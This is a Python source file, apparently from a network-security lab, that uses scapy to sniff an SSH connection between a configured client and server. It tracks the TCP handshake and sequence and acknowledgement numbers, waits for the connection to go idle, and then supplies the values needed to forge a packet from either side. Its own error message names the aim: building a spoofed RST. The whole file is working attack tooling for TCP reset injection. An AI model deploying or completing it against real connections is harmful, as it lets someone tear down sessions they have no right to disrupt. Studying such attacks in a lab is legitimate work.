import threading
import time

from scapy.all import IP, TCP, sniff

from util import CLIENT_IP, SERVER_IP, SERVER_PORT, STABILITY_TIME, print_headers


class NetworkMonitor:
    def __init__(self):
        self.client_port = None

        self.client_next_seq = 0
        self.client_expected_server_seq = 0
        self.server_next_seq = 0
        self.server_expected_client_seq = 0

        self.server_syn_seq = None

        self.handshake_complete = False
        self.connection_stable = False

        self.last_packet_time = None

        self.state_lock = threading.Lock()
        self.stabilized_event = threading.Event()

        print("[*] NetworkMonitor initialized")

    def packet_handler(self, packet):
        if not packet.haslayer(IP):
            return
        if not packet.haslayer(TCP):
            return

        ip = packet[IP]
        tcp = packet[TCP]

        if not (
            (ip.src == CLIENT_IP and ip.dst == SERVER_IP)
            or (ip.src == SERVER_IP and ip.dst == CLIENT_IP)
        ):
            return

        if ip.src == CLIENT_IP:
            direction = "CLIENT_TO_SERVER"
        else:
            direction = "SERVER_TO_CLIENT"

        # Detect SSH SYN from client
        if (
            direction == "CLIENT_TO_SERVER"
            and "S" in tcp.flags
            and self.client_port is None
        ):
            self.client_port = tcp.sport
            print(
                f"\n[+] SSH connection detected: "
                f"{CLIENT_IP}:{self.client_port} -> {SERVER_IP}:{SERVER_PORT}"
            )

        if self.client_port is None:
            return

        valid_connection = (
            ip.src == CLIENT_IP
            and tcp.sport == self.client_port
            and ip.dst == SERVER_IP
            and tcp.dport == SERVER_PORT
        ) or (
            ip.src == SERVER_IP
            and tcp.sport == SERVER_PORT
            and ip.dst == CLIENT_IP
            and tcp.dport == self.client_port
        )

        if not valid_connection:
            return

        payload_size = len(bytes(tcp.payload))

        syn = 1 if "S" in tcp.flags else 0
        fin = 1 if "F" in tcp.flags else 0

        next_seq = tcp.seq + payload_size + syn + fin

        # Save server SYN-ACK seq
        if direction == "SERVER_TO_CLIENT" and "S" in tcp.flags and "A" in tcp.flags:
            self.server_syn_seq = tcp.seq

        # Detect final ACK of 3-way handshake
        if (
            direction == "CLIENT_TO_SERVER"
            and "A" in tcp.flags
            and not ("S" in tcp.flags)
            and payload_size == 0
            and self.server_syn_seq is not None
            and tcp.ack == self.server_syn_seq + 1
            and not self.handshake_complete
        ):
            with self.state_lock:
                self.handshake_complete = True
                self.last_packet_time = time.time()

            print("[+] TCP connection established.")
            print(f"[+] Starting {STABILITY_TIME}-second inactivity timer.")

        # Track sequence numbers
        if direction == "CLIENT_TO_SERVER":
            self.client_next_seq = max(self.client_next_seq, next_seq)
            self.client_expected_server_seq = max(
                self.client_expected_server_seq, tcp.ack
            )
        else:
            self.server_next_seq = max(self.server_next_seq, next_seq)
            self.server_expected_client_seq = max(
                self.server_expected_client_seq, tcp.ack
            )

        # Reset inactivity timer on every packet after handshake
        if self.handshake_complete:
            with self.state_lock:
                self.last_packet_time = time.time()

        print(
            f"{ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport}"
            f" | Flags: {tcp.flags}"
            f" | SEQ: {tcp.seq}"
            f" | ACK: {tcp.ack}"
            f" | Payload: {payload_size}"
            f" | NextSeq: {next_seq}"
            f" | {direction}"
        )

        print(
            f"   State => C->S: SEQ={self.client_next_seq}, "
            f"ACK={self.client_expected_server_seq} | "
            f"S->C: SEQ={self.server_next_seq}, "
            f"ACK={self.server_expected_client_seq}"
        )

        if payload_size == 0:
            print_headers(ip, tcp)

    def stability_monitor(self):
        while True:
            time.sleep(1)
            with self.state_lock:
                if not self.handshake_complete:
                    continue
                if self.connection_stable:
                    return
                if self.last_packet_time is None:
                    continue
                inactive_time = time.time() - self.last_packet_time

            print(f"[STABILITY] Inactive for {inactive_time:.1f}s / {STABILITY_TIME}s")

            if inactive_time >= STABILITY_TIME:
                with self.state_lock:
                    self.connection_stable = True
                print("\n[+] CONNECTION STABILIZED")
                print(f"[+] No packets transferred for {STABILITY_TIME} seconds.")
                self.stabilized_event.set()
                return

    def start(self):
        packet_thread = threading.Thread(
            target=lambda: sniff(filter="tcp", prn=self.packet_handler, store=False),
            daemon=True,
        )
        stability_thread = threading.Thread(target=self.stability_monitor, daemon=True)

        packet_thread.start()
        stability_thread.start()
        print("[*] Sniffer + stability monitor started")

    def wait_for_stability(self):
        self.stabilized_event.wait()

    def get_state(self, target):
        with self.state_lock:
            if self.client_port is None:
                raise RuntimeError(
                    "client_port is None — no SSH SYN was captured. Cannot build RST."
                )

            if target == "SERVER":
                # Spoof packet FROM client TO server
                return {
                    "source_ip": CLIENT_IP,
                    "source_port": self.client_port,
                    "destination_ip": SERVER_IP,
                    "destination_port": SERVER_PORT,
                    "seq": self.client_next_seq,  # client's next seq
                    "ack": self.server_next_seq,  # server's next seq
                }

            # Spoof packet FROM server TO client
            return {
                "source_ip": SERVER_IP,
                "source_port": SERVER_PORT,
                "destination_ip": CLIENT_IP,
                "destination_port": self.client_port,
                "seq": self.server_next_seq,  # server's next seq
                "ack": self.client_next_seq,  # client's next seq
            }
